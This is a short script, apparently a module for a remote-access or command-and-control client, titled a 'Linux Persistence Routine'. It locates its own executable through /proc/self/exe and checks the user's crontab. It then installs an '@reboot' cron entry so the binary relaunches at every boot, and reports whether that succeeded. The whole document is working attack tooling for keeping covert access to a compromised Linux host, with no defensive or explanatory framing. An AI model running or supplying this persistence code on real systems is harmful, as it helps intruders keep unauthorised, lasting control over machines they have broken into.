print_log("Starting Linux Persistence Routine...");

// 1. Locate Self
// We use /proc/self/exe to find where the client binary is currently running
let self_path = exec_os("readlink -f /proc/self/exe");
self_path = self_path.trim(); // Remove newlines

if self_path.len() < 2 {
    return "Error: Could not determine current executable path.";
}

print_log("Detected Self Path: " + self_path);

// 2. Check for existing persistence
let current_cron = exec_os("crontab -l");
if current_cron.contains(self_path) {
    return "Persistence already exists in crontab.";
}

// 3. Install Crontab Entry
// We interpret the crontab, append our new line, and pipe it back into crontab -
let cron_cmd = "(crontab -l 2>/dev/null; echo \"@reboot " + self_path + "\") | crontab -";
let result = exec_os(cron_cmd);

// 4. Verify
let check = exec_os("crontab -l");
if check.contains(self_path) {
    return "[SUCCESS] Persistence established via Cron (@reboot).\nBinary: " + self_path;
} else {
    return "[FAILURE] Could not install cron job.\nOutput: " + result;
}
